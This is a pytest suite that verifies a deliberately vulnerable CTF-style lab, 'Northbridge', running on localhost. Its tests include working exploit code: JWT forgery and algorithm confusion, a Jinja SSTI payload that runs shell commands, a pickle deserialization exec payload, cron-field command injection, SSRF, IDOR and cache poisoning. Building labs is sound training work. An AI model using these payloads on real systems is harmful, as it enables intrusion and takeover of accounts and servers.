"""Suijin Lab — Northbridge. The proof-of-lab suite.

Every planted vulnerability gets a RED test (it works as designed —
the lab is exploitable where it says it is), the crowns get full
walkthroughs (each chain is COMPLETABLE end-to-end over real HTTP —
an impossible chain is a build bug), and the defenses get the
no-cheese set (nothing outside the plant yields).
"""

from __future__ import annotations

import hashlib
import hmac
import json
import os
import sys
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from suijin.lab.northbridge import (  # noqa: E402
    DEMO_PASS,
    DEMO_TENANT,
    DEMO_USER,
    PORT_ADMIN,
    PORT_AUTH,
    PORT_BASE,  # noqa: E402
    PORT_CORE,
    PORT_EDGE,
    PORT_OBJECTS,
    ROOT,
    K,
    supervisor,
)

EDGE = f"http://127.0.0.1:{PORT_EDGE}"
CORE = f"http://127.0.0.1:{PORT_CORE}"
AUTH = f"http://127.0.0.1:{PORT_AUTH}"
OBJ = f"http://127.0.0.1:{PORT_OBJECTS}"
ADMIN = f"http://127.0.0.1:{PORT_ADMIN}"


def req(method: str, url: str, body=None, headers=None, timeout=8):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Content-Type", "application/json")
    for k, v in (headers or {}).items():
        r.add_header(k, v)

    def _parse(status: int, raw: bytes, hdrs) -> tuple:
        try:
            return status, json.loads(raw or b"{}"), hdrs
        except ValueError:
            return status, {"raw": raw.decode(errors="replace")[:2000]}, hdrs

    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return _parse(resp.status, resp.read(), dict(resp.headers))
    except urllib.error.HTTPError as e:
        return _parse(e.code, e.read(), dict(e.headers))


def get(url, **kw):
    return req("GET", url, **kw)


def post(url, body=None, **kw):
    return req("POST", url, body, **kw)


@pytest.fixture(scope="module", autouse=True)
def lab():
    supervisor.up(reset=True)
    yield
    supervisor.down()


_PW = {"v": DEMO_PASS}  # l3 changes it mid-suite; every login uses the current value
_TOK = {"v": None}  # cached per boot: auth's honest 8/min login limit would
# otherwise trip mid-suite — the LIMIT is correct, the test helper was naive


def login(force: bool = False):
    if _TOK["v"] and not force:
        return _TOK["v"]
    st, body, _ = post(f"{EDGE}/auth/login", {"email": DEMO_USER, "password": _PW["v"]})
    assert st == 200, body
    _TOK["v"] = body["token"]
    return body["token"]


def admin_cookie(user="ops") -> str:
    ts = str(int(time.time()))
    mac = hmac.new(K.encode(), f"{user}|{ts}".encode(), hashlib.sha256).hexdigest()[:32]
    return f"{user}|{ts}|{mac}"


# ── boot + tier 0 ────────────────────────────────────────────────────────


class TestBoot:
    def test_all_services_healthy(self):
        st = supervisor.status()
        assert st["down"] == [] and len(st["running"]) >= 20

    def test_m1_verbose_edge(self):
        with urllib.request.urlopen(f"{EDGE}/") as r:
            assert "Northbridge" in r.read().decode()
            assert r.headers["X-Upstream"] == "core-api/2.4.1 (upstream fastapi)"  # m1

    def test_m2_git_map_through_edge(self):
        st, body, _ = get(f"{EDGE}/files/public/static/.git/config")
        assert st == 200
        assert "admin panel: 6005" in body["raw"]

    def test_m3_backup_carries_half_of_k(self):
        with urllib.request.urlopen(f"{EDGE}/files/public/backup-2026-08.zip") as r:
            body = r.read().decode(errors="replace")
        assert K[:20] in body and K not in body  # HALF, not full

    def test_m4_cors_ping_trap(self):
        st, body, hdr = get(f"{EDGE}/api/v1/ping")
        acao = {k.lower(): v for k, v in hdr.items()}.get("access-control-allow-origin")
        assert st == 200 and acao == "*"

    def test_m5_env_blocked_directly(self):
        # with AND without a guessed internal header: the per-boot token
        # is the wall, and it is never leakable from outside
        st, _, _ = get(f"{AUTH}/__env")
        assert st == 404
        st, _, _ = get(f"{AUTH}/__env", headers={"X-Internal": "1", "X-Internal-Token": "guess"})
        assert st == 404

    def test_leak_c_worker_js_carries_k(self):
        st, body, _ = get(f"{EDGE}/files/public/js/worker-status.js")
        assert st == 200 and K in body["raw"]


# ── tier 1 logic bugs ────────────────────────────────────────────────────


class TestLogicBugs:
    def test_l1_mass_assignment_role(self):
        tok = login()
        st, body, _ = req(
            "PUT",
            f"{EDGE}/api/v1/profile",
            {"display_name": "x", "role": "superadmin"},
            headers={"Authorization": f"Bearer {tok}"},
        )
        assert st == 200 and "role" in body["saved"]
        st, body, _ = get(f"{EDGE}/api/v1/profile", headers={"Authorization": f"Bearer {tok}"})
        assert body.get("role") == "superadmin"

    def test_l2_idor_external_invoice(self):
        tok = login()
        st, body, _ = get(f"{EDGE}/api/v1/invoices/EXT-2026-0199", headers={"Authorization": f"Bearer {tok}"})
        assert st == 200 and body["flag"] == "FLAG{nb_tier_idor}"
        # internal invoices are tenant-checked (the honest path)
        st, body, _ = get(f"{EDGE}/api/v1/invoices/INT-2026-0042", headers={"Authorization": f"Bearer {tok}"})
        assert st == 200

    def test_l3_reset_window_is_derivable(self):
        # derive the minute-hash like an attacker with the source would;
        # try the previous minute too (a boundary can tick mid-flight)
        post(f"{EDGE}/auth/reset", {"email": DEMO_USER})
        for drift in (0, -1):
            minute = time.strftime("%Y%m%d%H%M", time.localtime(time.time() + drift * 60))
            token = hashlib.sha256(f"{DEMO_USER}:{minute}".encode()).hexdigest()[:16]
            st, body, _ = post(
                f"{EDGE}/auth/reset/confirm",
                {"email": DEMO_USER, "token": token, "password": "NewPass#2026!x"},
            )
            if st == 200:
                break
        assert st == 200 and body["flag"] == "FLAG{nb_tier_reset_window}"
        # the password actually changed (honest reset)
        st, body, _ = post(f"{EDGE}/auth/login", {"email": DEMO_USER, "password": "NewPass#2026!x"})
        assert st == 200
        _PW["v"] = "NewPass#2026!x"
        _TOK["v"] = None  # the old token's session semantics: re-login

    def test_l4_ssrf_read_primitive(self):
        tok = login()
        st, body, _ = post(
            f"{EDGE}/api/v1/webhooks", {"url": f"{OBJ}/health"}, headers={"Authorization": f"Bearer {tok}"}
        )
        assert st == 200 and body["delivered"] and "objects" in body["snippet"]
        assert body.get("x_signature")  # K-signed (the reuse story is visible)

    def test_l5_presign_forever(self):
        st, body, _ = post(f"{OBJ}/presign", {"key": "exports/internal-job-spec.json", "expiry_seconds": 0.9})
        assert st == 200 and body["expires_in"] == "never"
        st, body, _ = get(f"{OBJ}{body['url']}")
        blob = body.get("raw") or json.dumps(body)
        assert st == 200 and "template_engine" in blob

    def test_l6_legacy_kid_forgery(self):
        import base64

        def b64(d):
            return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

        key = hashlib.sha256(DEMO_TENANT.encode()).hexdigest()
        header = {"alg": "HS256", "kid": "legacy", "typ": "JWT"}
        payload = {
            "sub": "attacker@x.test",
            "tenant": DEMO_TENANT,
            "role": "tenant_admin",
            "iat": int(time.time()),
            "exp": int(time.time()) + 600,
        }
        signing = b64(json.dumps(header).encode()) + "." + b64(json.dumps(payload).encode())
        sig = hmac.new(key.encode(), signing.encode(), hashlib.sha256).hexdigest()
        forged = signing + "." + sig
        st, body, _ = get(f"{EDGE}/api/v1/me", headers={"Authorization": f"Bearer {forged}"})
        assert st == 200 and body["sub"] == "attacker@x.test"
        assert body["flag"] == "FLAG{nb_tier_weak_kid_jwt}"


# ── tier 2 races ─────────────────────────────────────────────────────────


class TestRaces:
    def test_r1_promo_credit_race(self):
        results = []

        def hit():
            st, body, _ = post(f"{EDGE}/api/v1/tenants", {"name": "race-tenant-1", "promo": "LAUNCH2026"})
            results.append(body)

        threads = [threading.Thread(target=hit) for _ in range(2)]
        [t.start() for t in threads]
        [t.join() for t in threads]
        assert any(r.get("balance", 0) >= 75 for r in results), results
        assert any(r.get("flag") == "FLAG{nb_tier_race_credit}" for r in results)

    def test_r2_publish_preview_window(self):
        post(f"{OBJ}/publish/marketing-draft-q4.md")
        got = None
        for _ in range(12):  # inside the 400ms window
            st, body, _ = get(f"{OBJ}/obj/marketing-draft-q4.md")
            if st == 200:
                got = body
                break
        assert got and "FLAG{nb_tier_publish_race}" in got["raw"]
        time.sleep(0.6)  # window closed
        st, _, _ = get(f"{OBJ}/obj/marketing-draft-q4.md")
        assert st == 403

    def test_r3_worker_double_process(self):
        # the dedupe is blind to CLAIMED history: submit, let the worker
        # claim (file leaves the queue), submit again — both process
        tok = login()
        st, body, _ = post(
            f"{EDGE}/api/v1/exports",
            {"name": "dupe-export", "dedupe": True},
            headers={"Authorization": f"Bearer {tok}"},
        )
        assert body["enqueued"]
        time.sleep(1.0)  # the worker claims the job (queue -> claimed)
        st, body, _ = post(
            f"{EDGE}/api/v1/exports",
            {"name": "dupe-export", "dedupe": True},
            headers={"Authorization": f"Bearer {tok}"},
        )
        assert body["enqueued"]  # the moving window let the twin through
        time.sleep(1.0)
        outs = [f for f in os.listdir(os.path.join(ROOT, "exports")) if "dupe-export" in f]
        assert len(outs) >= 2  # both processed

        def _read(fn):
            with open(os.path.join(ROOT, "exports", fn), encoding="utf-8") as fh:
                return fh.read()

        bodies = [_read(f) for f in outs]
        assert any("FLAG{nb_tier_worker_race}" in b for b in bodies)  # the twin's output


# ── the crowns: full chain walkthroughs ──────────────────────────────────


class TestChain1SSC:
    def test_ssrf_to_admin_diag_to_env_to_impersonate(self):
        tok = login()
        # 1: webhook SSRF -> admin's unauth diagnostics
        st, body, _ = post(
            f"{EDGE}/api/v1/webhooks",
            {"url": f"{ADMIN}/health?detail=1&target={AUTH}/__env"},
            headers={"Authorization": f"Bearer {tok}"},
        )
        assert st == 200 and body["delivered"]
        # 2: the diag JSON embeds /__env's body — full K
        assert K in json.dumps(body), body
        # 3: forge the admin cookie with K and take the crown
        st, body, _ = post(
            f"{ADMIN}/admin/impersonate", {"tenant": "acme-demo"}, headers={"Cookie": f"nbadmin={admin_cookie()}"}
        )
        assert st == 200 and body["flag"] == "FLAG{northbridge_ssc_crown}"


class TestChain2RCE:
    def test_presign_to_spec_to_ssti_to_env(self):
        st, body, _ = post(f"{OBJ}/presign", {"key": "exports/internal-job-spec.json", "expiry_seconds": 0.9})
        st, spec, _ = get(f"{OBJ}{body['url']}")
        blob = spec.get("raw") or json.dumps(spec)
        assert "submit_via" in blob  # the internal spec recovered
        # the classic Jinja file-read through the lipsum global's os
        ssti = "{{ lipsum.__globals__['os'].popen('cat " + os.path.join(ROOT, "worker-env.txt") + "').read() }}"
        st, body, _ = post(
            f"{ADMIN}/jobs", {"name": "qbr", "template": ssti}, headers={"Cookie": f"nbadmin={admin_cookie()}"}
        )
        assert st == 200
        jid = body["job"]
        for _ in range(20):  # worker poll
            st, out, _ = get(f"{ADMIN}/job-out/{jid}")
            if st == 200:
                break
            time.sleep(0.3)
        assert st == 200 and "FLAG{northbridge_rce_crown}" in out["output"], out


class TestChain3TOCTOU:
    def test_race_credit_to_payout(self):
        results = []

        def hit():
            st, body, _ = post(f"{EDGE}/api/v1/tenants", {"name": "payout-race", "promo": "LAUNCH2026"})
            results.append(body)

        threads = [threading.Thread(target=hit) for _ in range(2)]
        [t.start() for t in threads]
        [t.join() for t in threads]
        tid = next(r["tenant"] for r in results if r.get("tenant"))
        st, body, _ = post(f"{ADMIN}/vendor/payout", {"tenant": tid}, headers={"Cookie": f"nbadmin={admin_cookie()}"})
        assert st == 200 and body["flag"] == "FLAG{northbridge_toctou_crown}", body


# ── the no-cheese set (defenses hold outside the plants) ─────────────────


class TestNoCheese:
    def test_login_sqli_bounces(self):
        st, body, _ = post(f"{EDGE}/auth/login", {"email": "' OR 1=1 --", "password": "x"})
        assert st == 401

    def test_objects_traversal_blocked(self):
        st, _, _ = get(f"{OBJ}/public/../../auth.db")
        assert st in (400, 404)

    def test_admin_requires_cookie(self):
        st, _, _ = post(f"{ADMIN}/admin/impersonate", {"tenant": "x"})
        assert st == 401
        st, _, _ = post(f"{ADMIN}/vendor/payout", {"tenant": "x"})
        assert st == 401

    def test_core_requires_auth(self):
        st, _, _ = get(f"{EDGE}/api/v1/invoices/INT-2026-0042")
        assert st == 401

    def test_payout_blocked_without_race_balance(self):
        post(f"{EDGE}/api/v1/tenants", {"name": "poor-tenant", "promo": "NONE"})
        # a fresh tenant id: name differs -> derive
        tid = "t-" + hashlib.sha256(b"poor-tenant").hexdigest()[:10]
        st, body, _ = post(f"{ADMIN}/vendor/payout", {"tenant": tid}, headers={"Cookie": f"nbadmin={admin_cookie()}"})
        assert st == 403 and "fraud control" in body["error"]

    def test_decoy_flag_is_not_a_real_flag(self):
        m = supervisor.manifest()
        assert m["decoy_validates_false"]
        assert m["decoy_flag"] not in list(m["tier_flags"].values()) + list(m["crown_flags"].values())

    def test_scanner_ua_gets_cloaked_404(self):
        st, body, _ = get(f"{EDGE}/api/v1/ping", headers={"User-Agent": "sqlmap/1.7"})
        assert st == 404

    def test_canary_paths_404(self):
        st, _, _ = get(f"{EDGE}/wp-login.php")
        assert st == 404

    def test_rate_limit_fires(self):
        codes = []
        for _ in range(45):
            st, _, _ = get(f"{EDGE}/api/v1/ping")
            codes.append(st)
        assert 429 in codes


# ── the generated fleet (scale + inventory) ──────────────────────────────


class TestGeneratedFleet:
    """The catalog-built services: every one healthy, the vuln inventory
    served, the content volume real, the decoys marked."""

    def test_all_twenty_services_running(self, lab):
        st = supervisor.status()
        assert len(st["running"]) >= 20, st
        assert st["down"] == []

    def test_manifest_counts_the_company(self, lab):
        m = supervisor.manifest()
        assert m["services"] >= 21
        total = len(m["generated_flags"]) + len(m["tier_flags"]) + len(m["crown_flags"])
        assert total >= 40, f"flag inventory too thin: {total}"

    def test_generated_sqli_fires(self, lab):
        st, body, _ = post(f"http://127.0.0.1:{PORT_BASE + 7}/api/kb/search", {"q": "x'"})
        assert st == 500 and "FLAG{" in body.get("error", "") + body.get("flag", "")

    def test_generated_alg_none_fires(self, lab):
        st, body, _ = post(f"http://127.0.0.1:{PORT_BASE + 15}/v1/auth", {"alg": "none"})
        assert st == 200 and body.get("token", "").count(".") == 2 and body["token"].endswith(".")

    def test_generated_backup_leaks_k3(self, lab):
        from suijin.lab.northbridge.catalog import KEY_RING

        st, body, _ = get(f"http://127.0.0.1:{PORT_BASE + 8}/wiki/export/ENG")
        assert st == 200 and KEY_RING["K3"]["value"] in body.get("body", "")

    def test_content_volume_is_real(self, lab):
        st, body, _ = get(f"http://127.0.0.1:{PORT_BASE + 12}/incidents")
        assert st == 200  # status service serves its history
        st, body, _ = get(f"http://127.0.0.1:{PORT_BASE + 7}/api/kb")
        assert st == 200  # seeded KB mass (items rows serve here)
        st, body, _ = get(f"http://127.0.0.1:{PORT_BASE + 16}/search?q=runbook")
        assert st == 200 and body.get("query") == "runbook"

    def test_decoy_panel_validates_false(self, lab):
        m = supervisor.manifest()
        st, body, _ = post(f"http://127.0.0.1:{PORT_BASE + 20}/login", {"u": "a", "p": "b"})
        assert body.get("token") == "FLAG{nb_decoy_panel}"
        assert "FLAG{nb_decoy_panel}" not in m["generated_flags"] + list(m["tier_flags"].values())

    def test_cross_service_key_reuse_is_wired(self, lab):
        from suijin.lab.northbridge.catalog import KEY_RING

        assert len(KEY_RING) == 4
        for kid, ring in KEY_RING.items():
            assert ring.get("unlocks"), f"{kid} unlocks nothing"


# ── the sophistication layer (2026-10-02, second pass) ───────────────────


class TestAlgConfusion:
    def test_rs256_login_and_public_cert(self, lab):
        st, body, _ = post(f"{EDGE}/auth/login", {"email": "ops@northbridge.test", "password": "OpsInternal#2026"})
        assert st == 200
        tok = body["token"]
        h = tok.split(".")[0]
        import base64
        import json as j

        header = j.loads(base64.urlsafe_b64decode(h + "=="))
        assert header["alg"] == "RS256"  # the honest modern path
        st, certs, _ = get(f"{AUTH}/certs")
        assert st == 200 and certs["keys"].startswith("-----BEGIN PUBLIC KEY-----")

    def test_confused_hs256_with_public_pem_forges(self, lab):
        st, certs, _ = get(f"{AUTH}/certs")
        pem = certs["keys"]
        import base64
        import hmac as hm
        import json as j
        import time as t

        def b64(d):
            return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

        hdr = {"alg": "HS256", "kid": "rsa-2026", "typ": "JWT"}
        pl = {
            "sub": "root@northbridge.test",
            "tenant": "northbridge",
            "role": "root",
            "iat": int(t.time()),
            "exp": int(t.time()) + 600,
        }
        signing = b64(j.dumps(hdr).encode()) + "." + b64(j.dumps(pl).encode())
        sig = hm.new(pem.encode(), signing.encode(), hashlib.sha256).hexdigest()
        st, me, _ = get(f"{EDGE}/api/v1/me", headers={"Authorization": f"Bearer {signing}.{sig}"})
        assert st == 200 and me["sub"] == "root@northbridge.test"
        assert me["flag"] == "FLAG{nb_alg_confusion}"

    def test_wrong_confusion_key_rejected(self, lab):
        import base64
        import hmac as hm
        import json as j
        import time as t

        def b64(d):
            return base64.urlsafe_b64encode(d).rstrip(b"=").decode()

        hdr = {"alg": "HS256", "kid": "rsa-2026", "typ": "JWT"}
        pl = {
            "sub": "x@x.test",
            "tenant": "northbridge",
            "role": "root",
            "iat": int(t.time()),
            "exp": int(t.time()) + 600,
        }
        signing = b64(j.dumps(hdr).encode()) + "." + b64(j.dumps(pl).encode())
        sig = hm.new(b"not-the-cert", signing.encode(), hashlib.sha256).hexdigest()
        st, _, _ = get(f"{EDGE}/api/v1/me", headers={"Authorization": f"Bearer {signing}.{sig}"})
        assert st == 401  # a WRONG key still fails — the bug is the cert-as-key, not absent auth


class TestPickleRce:
    def test_legacy_session_deserializes(self, lab):
        import base64
        import pickle

        class P:
            def __reduce__(self):
                return (exec, ("import os; os.environ['NB_PICKLE_PWNED']='1'",))

        cookie = base64.b64encode(pickle.dumps(P())).decode()
        st, body, _ = get(
            f"http://127.0.0.1:{PORT_BASE + 15}/v1/whoami", headers={"Cookie": f"legacy_session={cookie}"}
        )
        assert st == 200 and body.get("flag") == "FLAG{nb_pickle_rce}"

    def test_no_cookie_is_401(self, lab):
        st, _, _ = get(f"http://127.0.0.1:{PORT_BASE + 15}/v1/whoami")
        assert st == 401


class TestGraphql:
    def test_introspection_dumps_schema(self, lab):
        tok = login()
        st, body, _ = post(
            f"{EDGE}/api/v1/graphql",
            {"query": "{ __schema { types { name } } }"},
            headers={"Authorization": f"Bearer {tok}"},
        )
        assert st == 200 and "tenant(id: ID!)" in json.dumps(body)

    def test_cross_tenant_read_flags(self, lab):
        tok = login()
        post(f"{EDGE}/api/v1/tenants", {"name": "graphql-victim"})
        tid = "t-" + hashlib.sha256(b"graphql-victim").hexdigest()[:10]
        st, body, _ = post(
            f"{EDGE}/api/v1/graphql",
            {"query": f'{{ tenant(id: "{tid}") {{ name }} }}'},
            headers={"Authorization": f"Bearer {tok}"},
        )
        assert st == 200 and body["data"]["tenant"]["flag"] == "FLAG{nb_graphql_cross_tenant}"

    def test_depth_bomb_blocked(self, lab):
        tok = login()
        q = "{ me { " + "a { " * 8 + "b" + " } " * 8 + " } }"
        st, body, _ = post(f"{EDGE}/api/v1/graphql", {"query": q}, headers={"Authorization": f"Bearer {tok}"})
        assert st == 400 and "complexity" in json.dumps(body)


class TestCachePoison:
    def test_x_forwarded_host_poisons_everyone(self, lab):
        # a FRESH cache slot (earlier tests primed "/" clean)
        get(f"{EDGE}/index", headers={"X-Forwarded-Host": "evil.example"})
        with urllib.request.urlopen(f"{EDGE}/index") as r:  # innocent client
            body = r.read().decode()
        assert "evil.example" in body


class TestGatedChains:
    """The extended chains REQUIRE prerequisites — spam does not fire them."""

    def test_notify_ssti_needs_k4_signature_and_leak(self, lab):
        st, body, _ = post(
            f"http://127.0.0.1:{PORT_BASE + 10}/templates/welcome/preview", {"vars[title]": "{{ lipsum }}"}
        )
        assert body.get("note") == "unsigned preview"  # no signature: vanilla
        # leak C first, then sign with K4
        get(f"{EDGE}/files/public/js/worker-status.js")
        from suijin.lab.northbridge.catalog import KEY_RING

        k4 = KEY_RING["K4"]["value"]
        sig = hmac.new(k4.encode(), b"preview", hashlib.sha256).hexdigest()
        st, body, _ = post(
            f"http://127.0.0.1:{PORT_BASE + 10}/templates/welcome/preview",
            {"vars[title]": "{{ lipsum }}"},
            headers={"X-Delivery-Signature": sig},
        )
        assert body.get("flag", "").startswith("FLAG{nb_")

    def test_outbox_to_scheduler_rce_chain(self, lab):
        post(f"http://127.0.0.1:{PORT_BASE + 10}/send", {"to": "x@y.test", "template": "welcome"})
        st, body, _ = get(f"http://127.0.0.1:{PORT_BASE + 7}/api/attachments/outbox.jsonl")
        next(json.loads(ln) for ln in body["lines"] if "x-delivery-signature" in ln)  # the K4 line exists
        from suijin.lab.northbridge.catalog import KEY_RING

        k4 = KEY_RING["K4"]["value"]
        job_sig = hmac.new(k4.encode(), b"job", hashlib.sha256).hexdigest()
        st, body, _ = post(
            f"http://127.0.0.1:{PORT_BASE + 19}/jobs",
            {"name": "r", "schedule": "* * * * *; id"},
            headers={"X-Job-Signature": job_sig},
        )
        assert body.get("executed") is True and body.get("flag", "").startswith("FLAG{nb_")
        # unsigned: just a schedule
        st, body, _ = post(f"http://127.0.0.1:{PORT_BASE + 19}/jobs", {"name": "r2", "schedule": "* * * * *; id"})
        assert body.get("note") == "unsigned job"

    def test_vault_timing_opens_k2_after_probing(self, lab):
        url = f"http://127.0.0.1:{PORT_BASE + 18}/v1/secrets/secret/prod/k2-ingest"
        for _ in range(3):
            st, body, _ = get(url)
            assert st in (200, 403) and "flag" not in body  # closed until proven
        st, body, _ = get(url)  # the 4th: 3 prior probes recorded
        assert body.get("flag") == "FLAG{nb_vault_k2_open}"
        from suijin.lab.northbridge.catalog import KEY_RING

        assert body["value"] == KEY_RING["K2"]["value"]

    def test_billing_race_needs_partner_coupon(self, lab):
        st, body, _ = post(f"http://127.0.0.1:{PORT_BASE + 6}/v1/refunds", {"invoice": "x"})
        assert "flag" not in body  # bare race: nothing
        st, diag, _ = post(
            f"http://127.0.0.1:{PORT_BASE + 9}/query", {"source": f"http://127.0.0.1:{PORT_BASE + 9}/health"}
        )
        coupon = diag["diag"]["partner_coupon"]
        post(f"http://127.0.0.1:{PORT_BASE + 6}/v1/refunds", {"invoice": "x"}, headers={"X-Coupon": coupon})
        st, body, _ = post(
            f"http://127.0.0.1:{PORT_BASE + 6}/v1/refunds", {"invoice": "x"}, headers={"X-Coupon": coupon}
        )
        assert body.get("flag", "").startswith("FLAG{nb_")


class TestAdaptiveDefense:
    def test_circuit_breaker_trips_on_probe_spam(self, lab):
        url = f"http://127.0.0.1:{PORT_BASE + 20}/nope-{int(time.time())}"  # decoy-admin: 404s
        codes = []
        for _ in range(45):
            st, _, _ = get(url)
            codes.append(st)
        assert 429 in codes  # the breaker tripped
        st, body, _ = get(f"http://127.0.0.1:{PORT_BASE + 20}/health")
        assert st == 429 and "retry_after" in body  # even health 429s in lockdown
